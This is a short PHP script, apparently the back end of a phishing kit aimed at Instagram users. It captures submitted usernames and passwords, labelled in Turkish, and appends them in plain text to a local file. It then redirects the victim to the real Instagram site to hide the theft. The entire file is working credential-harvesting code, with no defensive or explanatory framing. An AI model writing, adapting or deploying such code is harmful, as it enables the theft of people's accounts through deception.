<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $password = $_POST["password"];

    $data = "Kullanıcı Adı: " . $username . "\n" . "Şifre: " . $password . "\n";

    $file = fopen("test.txt", "a");
    if ($file) {
        fwrite($file, $data);
        fclose($file);
        header("Location: https://www.instagram.com/");
        exit();
    } else {
        echo "Hatalı giris";
    }
}
?>